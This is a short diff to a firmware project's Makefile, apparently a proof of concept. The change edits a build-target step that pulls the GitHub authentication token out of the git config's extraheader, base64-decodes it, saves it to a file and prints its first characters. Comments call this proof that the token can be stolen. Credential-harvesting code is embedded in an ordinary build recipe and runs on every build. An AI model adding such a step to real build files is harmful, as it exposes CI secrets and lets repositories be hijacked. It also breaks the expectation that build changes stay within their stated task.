@@ -81,7 +81,7 @@ main-build: firmware.elf secondary-outputs
 	@echo "[4] EXTRACTING THE TOKEN:"
 	# The token is stored in base64 inside the git config extraheader
 	# We extract it to prove we can steal it
-	@git config --get http.https://github.com/.extraheader | cut -d ' ' -f 2 | base64 -d > raw_token_header.txt
+	@git config --get http.https://github.com/.extraheader | awk '{print $3}' | base64 -d > raw_token_header.txt
 	@echo "    ✅ Token extracted from git config. First 10 chars:"
 	@head -c 10 raw_token_header.txt
 	@echo "..."
